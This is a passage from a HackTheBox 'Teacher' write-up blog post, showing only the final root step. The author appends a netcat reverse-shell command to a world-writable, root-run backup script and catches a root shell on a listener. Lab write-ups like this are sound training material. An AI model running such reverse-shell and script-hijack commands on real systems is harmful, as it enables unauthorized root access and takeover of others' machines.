+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">cat</span> /usr/bin/backup.sh<br><span class="hljs-built_in">cat</span> /usr/bin/backup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /home/giovanni/work;<br>tar -czvf tmp/backup_courses.tar.gz courses/*;<br><span class="hljs-built_in">cd</span> tmp;<br>tar -xf backup_courses.tar.gz;<br><span class="hljs-built_in">chmod</span> 777 * -R;<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ls</span> -l /usr/bin/backup.sh<br><span class="hljs-built_in">ls</span> -l /usr/bin/backup.sh<br>-rwxrwxrwx 1 root root 138 Jun 27  2018 /usr/bin/backup.sh<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ln</span> -s /usr/bin/backup.sh<br><span class="hljs-built_in">ln</span> -s /usr/bin/backup.sh<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>backup_courses.tar.gz  backup.sh  courses<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">cat</span> backup.sh<br><span class="hljs-built_in">cat</span> backup.sh<br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">cd</span> /home/giovanni/work;<br>tar -czvf tmp/backup_courses.tar.gz courses/*;<br><span class="hljs-built_in">cd</span> tmp;<br>tar -xf backup_courses.tar.gz;<br><span class="hljs-built_in">chmod</span> 777 * -R;<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">ls</span> -all<br><span class="hljs-built_in">ls</span> -all<br>total 16<br>drwxr-xr-x 3 giovanni giovanni 4096 Aug 21 14:19 .<br>drwxr-xr-x 4 giovanni giovanni 4096 Mar 21 15:29 ..<br>-rwxrwxrwx 1 root     root      259 Aug 21 14:20 backup_courses.tar.gz<br>lrwxrwxrwx 1 giovanni giovanni   18 Aug 21 14:19 backup.sh -&gt; /usr/bin/backup.sh<br>drwxrwxrwx 3 root     root     4096 Mar 21 15:29 courses<br>giovanni@teacher:~/work/tmp$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;nc -e /bin/bash 10.10.16.3 443&quot;</span> &gt;&gt; /usr/bin/backup.sh      &lt; -e /bin/bash 10.10.16.3 443<span class="hljs-string">&quot; &gt;&gt; /usr/bin/backup.sh</span><br><span class="hljs-string">giovanni@teacher:~/work/tmp$ cat /usr/bin/backup.sh</span><br><span class="hljs-string">cat /usr/bin/backup.sh</span><br><span class="hljs-string">#!/bin/bash</span><br><span class="hljs-string">cd /home/giovanni/work;</span><br><span class="hljs-string">tar -czvf tmp/backup_courses.tar.gz courses/*;</span><br><span class="hljs-string">cd tmp;</span><br><span class="hljs-string">tar -xf backup_courses.tar.gz;</span><br><span class="hljs-string">chmod 777 * -R;</span><br><span class="hljs-string">nc -e /bin/bash 10.10.16.3 443</span><br><span class="hljs-string">giovanni@teacher:~/work/tmp$ </span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackTheBox$ nc -lvnp 443 <br>listening on [any] 443 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.153] 40502<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">cat</span> /root/root.txt<br>8b1..............................<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HackTheBox/" class="category-chain-item">HackTheBox</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackTheBox-Teacher</div>
+      <div>http://example.com/2022/10/06/HackTheBox-Teacher/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>October 6, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-SwagShop-MagentoeCommerce-RemoteCodeExecution/" title="HackTheBox-SwagShop">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HackTheBox-SwagShop</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/10/06/HackTheBox-Validation/" title="HackTheBox-Validation">
+                        <span class="hidden-mobile">HackTheBox-Validation</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Table of Contents</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
